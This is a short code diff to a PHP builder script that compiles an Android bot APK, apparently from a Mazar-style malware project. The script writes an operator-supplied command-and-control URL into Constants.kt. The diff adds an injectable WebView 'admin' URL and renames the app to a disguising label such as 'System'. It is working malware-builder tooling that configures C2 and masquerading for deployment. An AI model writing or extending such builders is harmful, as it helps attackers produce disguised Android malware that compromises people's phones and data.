@@ -12,6 +12,7 @@ if (empty($input)) {
 
 $apkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $input['apkName'] ?? 'Bot');
 $appLabel = $input['appLabel'] ?? 'System';
+$webviewUrl = $input['webviewUrl'] ?? 'https://google.com';
 $c2Url = $input['c2Url'] ?? '';
 
 function sendLog($msg, $data = []) {
@@ -34,10 +35,11 @@ sendLog("Starting build process for $apkName ($appLabel)...");
 $constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
 if (file_exists($constFile)) {
     $c = file_get_contents($constFile);
-    // Even more robust replacement for Kotlin var/val
+    // Robust replacement for Kotlin var/val properties
     $c = preg_replace('/(val|var)\s+urlConnection\s*=\s*".*?"/', '$1 urlConnection = "' . $c2Url . '"', $c);
+    $c = preg_replace('/(val|var)\s+urlAdmin\s*=\s*".*?"/', '$1 urlAdmin = "' . $webviewUrl . '"', $c);
     file_put_contents($constFile, $c);
-    sendLog("Updated Constants.kt with C2 URL: $c2Url");
+    sendLog("Updated Constants.kt with C2 URL: $c2Url and WebView URL: $webviewUrl");
 } else {
     sendLog("Warning: Constants.kt not found at $constFile");
 }
@@ -46,7 +48,8 @@ if (file_exists($constFile)) {
 $strFile = $baseDir . '/app/src/main/res/values/strings.xml';
 if (file_exists($strFile)) {
     $s = file_get_contents($strFile);
-    $s = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
+    // Ensure we replace the app_name string correctly
+    $s = preg_replace('/<string name="app_name">.*?<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
     file_put_contents($strFile, $s);
     sendLog("Updated strings.xml with App Label: $appLabel");
 }
